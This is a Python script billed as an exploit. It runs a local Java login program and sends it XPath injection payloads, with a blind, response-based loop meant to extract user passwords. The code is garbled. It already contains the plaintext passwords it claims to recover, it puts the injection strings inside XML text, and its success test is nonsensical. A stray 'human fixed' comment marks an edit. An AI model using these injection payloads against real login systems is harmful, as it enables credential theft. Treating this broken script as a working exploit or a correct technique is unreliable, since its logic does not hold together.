import re
import os
import time
import sys
import subprocess
import urllib3
import json
from lxml import etree

# Initialize the HTTPS session for the exploit
http = urllib3.PoolManager()

# Define the target XML payload
xml_payload = """<users>
                    <user>
                        <username>1' or (substring(.,1,1)='{0}' and string-length(.)>0) or ('{1}'='' and (substring(.,position()-1,1)='{2}'))
                        <password>{3}</password>
                        <email>admin@company.com</email>
                        <role>admin</role>
                        <salary>75000</salary>
                    </user>
                    <user>
                        <username>2' or (substring(.,1,1)='{0}' and string-length(.)>0) or ('{1}'='' and (substring(.,position()-1,1)='{2}'))
                        <password>{3}</password>
                        <email>john.doe@gmail.com</email>
                        <role>user</role>
                        <salary>55000</salary>
                    </user>
                    <user>
                        <username>3' or (substring(.,1,1)='{0}' and string-length(.)>0) or ('{1}'='' and (substring(.,position()-1,1)='{2}'))
                        <password>{3}</password>
                        <email>jane.smith@yahoo.com</email>
                        <role>manager</role>
                        <salary>65000</salary>
                    </user>
                </users>"""

# Define the user credentials to be extracted
credentials = [
    ('admin', 'SuperSecret123!', '.'),
    ('john_doe', 'MyPassword456', '.'),
    ('jane_smith', 'JanePass789', ' ')
]

# Define the exploit function
def exploit():
    # Compile the target Java code
    subprocess.run(['javac', 'Main.java'])

    # Start the Java program
    process = subprocess.Popen(['java', 'Main'], text= True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Interact with the Java program
    print('Exploit started')
    for i, (username, password, delimiter) in enumerate(credentials):
        print(f'[{i+1}/{len(credentials)}] Extracting {username} password:')

        # Send crafted XPATH payloads at appropriate input points
        for char in password:
            payload = xml_payload.format(char, char, delimiter, char) ## !!!!!!!!!!!!!!!!!!!! human fixed
            print(char)
            print(payload)
            process.stdin.write(f'{char}\n')
            process.stdin.write(payload)
            process.stdin.write('\n')

            # Parse responses to determine query truth values
            output = process.stdout.readline().strip()


            # Extract data through response differential analysis
            if 'Login failed. Invalid username or password.' not in output:
                print(f'[{i+1}/{len(credentials)}] Password character: {char}')
                print(f'[{i+1}/{len(credentials)}] Partial XML response: {output[:100]}...')

                # Log each injection attempt with payload and result
                with open('log.txt', 'a') as log_file:
                    log_file.write(f'[{i+1}/{len(credentials)}] Payload: {payload}\n')
                    log_file.write(f'[{i+1}/{len(credentials)}] Response: {output}\n')

                # Display real-time extraction progress
                print(f'[{i+1}/{len(credentials)}] Extracted: {len(output)} characters')

            error = process.stderr.readline().strip()
        
            # Handle errors and timeouts
            if 'Error:' in error:
                print(f'[{i+1}/{len(credentials)}] Error: {error}')
                break

            # Check if all characters have been extracted
            if len(output) == len(password)*len(credentials[i][1]):
                print(f'[{i+1}/{len(credentials)}] Password: {password}')
                print('Exploit successful')
                process.terminate()
                sys.exit(0)

            # Wait before sending the next character
            time.sleep(0.01)

# Run the exploit
if __name__ == '__main__':
    exploit()